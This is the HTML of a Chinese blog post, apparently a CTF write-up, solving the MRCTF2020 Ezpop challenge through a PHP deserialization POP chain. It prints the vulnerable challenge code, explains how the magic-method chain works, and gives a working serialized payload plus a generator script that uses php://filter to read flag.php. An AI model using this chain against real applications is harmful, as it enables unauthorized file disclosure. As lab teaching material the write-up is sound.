@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="考点反序列化pop链  这个很类似pwn里面的rop，就是走梅花桩的感觉。 解题源码分析，稍微debug修改了一下，不影响功能123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?php&#x2F;&#x2F;flag is in flag.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链">
+<meta property="og:url" content="http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="考点反序列化pop链  这个很类似pwn里面的rop，就是走梅花桩的感觉。 解题源码分析，稍微debug修改了一下，不影响功能123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?php&#x2F;&#x2F;flag is in flag.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/2022-04-23-18-49-11.png">
+<meta property="article:published_time" content="2022-04-23T09:30:40.000Z">
+<meta property="article:modified_time" content="2022-04-23T11:19:43.421Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/2022-04-23-18-49-11.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/22/BUUCTF-WEB-SWPU2019-Web1-%E6%97%A0%E5%88%97%E5%90%8Dsql%E6%B3%A8%E5%85%A5/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&text=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&title=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&is_video=false&description=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链&body=Check out this article: http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&title=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&title=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&title=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&title=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&name=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&t=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%8C%E7%A8%8D%E5%BE%AEdebug%E4%BF%AE%E6%94%B9%E4%BA%86%E4%B8%80%E4%B8%8B%EF%BC%8C%E4%B8%8D%E5%BD%B1%E5%93%8D%E5%8A%9F%E8%83%BD"><span class="toc-number">2.1.</span> <span class="toc-text">源码分析，稍微debug修改了一下，不影响功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%80%BB%E8%BE%91"><span class="toc-number">2.2.</span> <span class="toc-text">利用逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#private-protected%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96tips"><span class="toc-number">2.3.</span> <span class="toc-text">private protected反序列化tips</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">2.4.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/" class="leancloud-visitors" data-flag-title="BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-23T09:30:40.000Z" itemprop="datePublished">2022-04-23</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>反序列化pop链 </p>
+<p>这个很类似pwn里面的rop，就是走梅花桩的感觉。</p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="源码分析，稍微debug修改了一下，不影响功能"><a href="#源码分析，稍微debug修改了一下，不影响功能" class="headerlink" title="源码分析，稍微debug修改了一下，不影响功能"></a>源码分析，稍微debug修改了一下，不影响功能</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;<span class="comment">//被当作函数调用时触发include(modifier-&gt;var)</span></span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;including&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">//利用伪协议读取</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;<span class="comment">//modifier被当作函数调用时触发</span></span><br><span class="line">	    <span class="keyword">echo</span> <span class="string">&#x27;invodeing&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;tostring&lt;br&gt;&#x27;</span>;</span><br><span class="line">		<span class="title function_ invoke__">var_dump</span> (<span class="variable language_">$this</span>-&gt;str-&gt;source);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;<span class="comment">//这里可以构造触发Test类的__get</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;wakeup&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable language_">$this</span>-&gt;source)) &#123;<span class="comment">//这里source如果是class则会触发tostring</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;<span class="comment">//访问没有的属性触发</span></span><br><span class="line">	    <span class="keyword">echo</span> <span class="string">&#x27;getting&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;<span class="comment">//p=modifier</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用逻辑"><a href="#利用逻辑" class="headerlink" title="利用逻辑"></a>利用逻辑</h3><p>最终目的为触发include，如何触发？触发Modifier中的__invoke，也就是要以函数方式引用该类，也就是让Test类里面的p为一个Modifier类，那么就要触发Test类里面的__get，也就是要引用一个Test类里面没有属性。到此好像逻辑断了，不急看下面。</p>
+<p>那么如何触发Show里面的__tostring，那就要使用Show里面的__wakeup里面preg_match以this-&gt;source为字符串，也就是this-&gt;source为一个Show类，即使用show1-&gt;source&#x3D;show2 来触发。而__tostring恰好为引用show2-&gt;str-&gt;source，假如str是Test类呢，source又不是Test的属性，进而和上面的逻辑连上了，进而多层pop触发include。逻辑图如下。</p>
+<p><img src="/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/2022-04-23-18-49-11.png"></p>
+<h3 id="private-protected反序列化tips"><a href="#private-protected反序列化tips" class="headerlink" title="private protected反序列化tips"></a>private protected反序列化tips</h3><p>private属性序列化的时候格式是%00类名%00成员名<br>protect属性序列化的时候格式是%00*%00成员名<br>public&#x2F;var 不变<br>例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test1</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test2</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test3</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);  <span class="comment">//  O:4:&quot;test&quot;:3:&#123;s:11:&quot; test test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot; * test3&quot;;s:5:&quot;hello&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"> O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;\00test\00test1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;\00*\00test3&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>的参数被反序列化后变成 \<span class="number">00</span>test\<span class="number">00</span>test1</span><br><span class="line"><span class="keyword">public</span>的参数变成 test2 </span><br><span class="line"><span class="keyword">protected</span>的参数变成 \<span class="number">00</span>*\<span class="number">00</span>test3</span><br><span class="line">（在url中\<span class="number">00</span>换成%<span class="number">00</span>）</span><br></pre></td></tr></table></figure>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 因为var为protected性质，所以这里要将*var改成%00*%00var</span></span><br><span class="line">?pop=O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;source&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;source&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;Modifier&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;%00*%00var&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;&#125;&#125;&#125;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>
+<p>php脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;<span class="comment">//被当作函数调用时触发include(modifier-&gt;var)</span></span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$show1</span>=<span class="keyword">new</span> Show;</span><br><span class="line"><span class="variable">$show2</span>=<span class="keyword">new</span> Show;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="variable">$mod</span> =<span class="keyword">new</span> Modifier;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$show1</span>-&gt;source=<span class="variable">$show2</span>;</span><br><span class="line"><span class="variable">$show2</span>-&gt;str=<span class="variable">$test</span>;</span><br><span class="line"><span class="variable">$test</span>-&gt;p=<span class="variable">$mod</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$show1</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blackdn.github.io/2020/04/04/CTF-File-Inclusion-2020/">CTF-文件包含漏洞</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fish-pompom/p/11126473.html">PHP反序列化从初级到高级利用篇</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6753">一文让PHP反序列化从入门到进阶</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6454#toc-3">PHP反序列化进阶学习与总结</a><br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke">php魔法函数</a></p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%8C%E7%A8%8D%E5%BE%AEdebug%E4%BF%AE%E6%94%B9%E4%BA%86%E4%B8%80%E4%B8%8B%EF%BC%8C%E4%B8%8D%E5%BD%B1%E5%93%8D%E5%8A%9F%E8%83%BD"><span class="toc-number">2.1.</span> <span class="toc-text">源码分析，稍微debug修改了一下，不影响功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%80%BB%E8%BE%91"><span class="toc-number">2.2.</span> <span class="toc-text">利用逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#private-protected%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96tips"><span class="toc-number">2.3.</span> <span class="toc-text">private protected反序列化tips</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">2.4.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
